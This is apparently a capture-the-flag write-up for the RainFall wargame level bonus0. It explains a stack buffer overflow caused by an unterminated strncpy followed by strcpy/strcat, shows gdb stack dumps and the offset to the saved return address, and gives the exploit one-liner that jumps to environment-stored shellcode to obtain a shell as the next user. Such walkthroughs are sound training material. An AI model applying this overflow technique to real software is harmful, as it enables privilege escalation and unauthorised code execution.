This is a buffer overflow exploit.

There is a couple of bugs that lead to it.
The function p ends by a call to strnpcy that copies 20 bytes of the local
buffer into the target buffer passed as an argument to p.
If the argument passed to p is the address of a buffer of 20 or less bytes,
strncpy won't have enough space to put a terminating null byte.

It's the case for both buffers in pp. They both are exactly 20 bytes long.

... pp(char *b0){
	char b1[20]; <==
	char b2[20]; <==

	...
	strcpy(b0, b1);
	strcat(b0, b2);
	...
}

Keeping in mind the lack of terminating null byte in b1, we can deduce that the
call to strcpy() will copy the contents of both buffers, since they are
contiguous in memory, until a null byte is found on the stack.

Therefore it is possible to copy at least 60 bytes into the buffer contained in
the main function, thus leading to an overflow and enabling us to overwrite the
return address contained in the main stack frame.

Here is the state of the stack after imputing two test strings :

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
-
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
-
BBCCDDEEFFGGHHIIJJKK

Breakpoint 1, 0x080485b9 in main ()
(gdb) x/20wx $esp
0xbffff6c0:	0xbffff6d6	0x080498d8	0x00000001	0x0804835d
0xbffff6d0:	0xb7fd13e4	0x4141000d	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x42424141	0x44444343
0xbffff6f0:	0x46464545	0x48484747	0x4a4a4949	0x0ff44b4b
0xbffff700:	0x4220b7fd	0x44434342	0x46454544	0x48474746
(gdb) x/24wx $esp
0xbffff6c0:	0xbffff6d6	0x080498d8	0x00000001	0x0804835d
0xbffff6d0:	0xb7fd13e4	0x4141000d	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x42424141	0x44444343
0xbffff6f0:	0x46464545	0x48484747	0x4a4a4949	0x0ff44b4b
0xbffff700:	0x4220b7fd	0x44434342	0x46454544	0x48474746
(gdb) i f
Stack level 0, frame at 0xbffff710:
 eip = 0x80485b9 in main; saved eip 0x48474746 <- "FGGH" 
 Arglist at 0xbffff708, args:
 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
 Saved registers:
  ebp at 0xbffff708, eip at 0xbffff70c

As we can see, we need to input 9 bytes before reaching the location of the
saved eip on the stack.
There are 5 extra bytes that aren't present in the initial input strings.
These were copied by strcpy() since no '\0' was found up to that point.
The call to strcat() starts copying characters at address 0xbffff703 and onwards.

There is a problem in building the payload though, there are two calls to read()
in the program, which makes it trickier to build.

The solution is to send enough padding characters in our payload so that two
calls to read() are necessary to get to the relevant data.

The program expects a '\n' inside the read buffer otherwise it crashes.
There is no need to put it twice because the second call to read() overwrites
the content of the buffer.

Lastly, we need to put some shellcode in the environment and then print the 
variable's address on stdout using a C helper program.

bonus0@RainFall:~$ export SHELLCODE=$(...)

bonus0@RainFall:~$ sa=`/tmp/get_addr` python -c "import struct; print 'S' * 4095 + '\n' + 'S' * 9 + struct.pack('I', $sa) + 'S' * 7" > /tmp/a
bonus0@RainFall:~$ cat /tmp/a - | ./bonus0
 -
 -
SSSSSSSSSSSSSSSSSSSSSSSSSSSSS����SSSSSSS�� SSSSSSSSS����SSSSSSS��
whoami
bonus1
